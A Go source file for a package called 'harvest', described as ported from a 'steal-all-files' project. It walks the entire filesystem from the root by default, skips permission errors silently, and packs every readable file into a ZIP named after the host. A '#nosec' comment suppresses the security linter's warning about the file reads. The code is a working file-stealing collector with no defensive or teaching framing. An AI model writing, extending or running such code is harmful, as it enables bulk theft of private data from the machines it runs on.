// Package harvest provides functionality for recursively collecting and archiving files
// from a directory tree into a compressed ZIP file.
// Ported from the steal-all-files project (script.py).
package harvest

import (
	"archive/zip"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
)

// Options configures the file harvesting operation.
type Options struct {
	// SourcePath is the root directory to harvest. Defaults to the filesystem root.
	SourcePath string
	// OutputFile is the path for the output ZIP file.
	// Defaults to "<hostname>.zip" in the current directory.
	OutputFile string
}

// DefaultOptions returns Options with platform-appropriate defaults.
func DefaultOptions() Options {
	root := "/"
	if runtime.GOOS == "windows" {
		root = `C:\`
	}
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "harvest"
	}
	return Options{
		SourcePath: root,
		OutputFile: hostname + ".zip",
	}
}

// Result summarises the outcome of a Harvest call.
type Result struct {
	FilesAdded   int
	FilesSkipped int
	OutputFile   string
	OutputBytes  int64
}

// Run walks SourcePath and compresses all readable files into a ZIP archive at OutputFile.
// Files that cannot be read (e.g. due to permissions) are silently skipped.
func Run(opts Options) (Result, error) {
	if opts.SourcePath == "" {
		opts.SourcePath = DefaultOptions().SourcePath
	}
	if opts.OutputFile == "" {
		opts.OutputFile = DefaultOptions().OutputFile
	}

	info, err := os.Stat(opts.SourcePath)
	if err != nil {
		return Result{}, fmt.Errorf("source path error: %w", err)
	}
	if !info.IsDir() {
		return Result{}, fmt.Errorf("source path is not a directory: %s", opts.SourcePath)
	}

	f, err := os.Create(opts.OutputFile)
	if err != nil {
		return Result{}, fmt.Errorf("create output file: %w", err)
	}
	defer f.Close()

	zw := zip.NewWriter(f)
	defer zw.Close()

	var added, skipped int

	walkErr := filepath.Walk(opts.SourcePath, func(path string, fi os.FileInfo, err error) error {
		if err != nil {
			// Permission denied or other walk error — skip silently
			skipped++
			return nil
		}
		if fi.IsDir() {
			return nil
		}

		relPath, err := filepath.Rel(opts.SourcePath, path)
		if err != nil {
			skipped++
			return nil
		}

		if err := addFile(zw, path, relPath); err != nil {
			skipped++
			return nil
		}
		added++
		return nil
	})
	if walkErr != nil {
		return Result{}, fmt.Errorf("walk error: %w", walkErr)
	}

	// Flush the zip writer before stat
	if err := zw.Close(); err != nil {
		return Result{}, fmt.Errorf("close zip: %w", err)
	}
	if err := f.Close(); err != nil {
		return Result{}, fmt.Errorf("close output file: %w", err)
	}

	fi, err := os.Stat(opts.OutputFile)
	var outputBytes int64
	if err == nil {
		outputBytes = fi.Size()
	}

	return Result{
		FilesAdded:   added,
		FilesSkipped: skipped,
		OutputFile:   opts.OutputFile,
		OutputBytes:  outputBytes,
	}, nil
}

// addFile writes a single file into the ZIP archive with DEFLATE compression.
func addFile(zw *zip.Writer, srcPath, archiveName string) error {
	src, err := os.Open(srcPath) // #nosec G304 — intentional: harvesting files by design
	if err != nil {
		return err
	}
	defer src.Close()

	w, err := zw.CreateHeader(&zip.FileHeader{
		Name:   filepath.ToSlash(archiveName),
		Method: zip.Deflate,
	})
	if err != nil {
		return err
	}

	_, err = io.Copy(w, src)
	return err
}
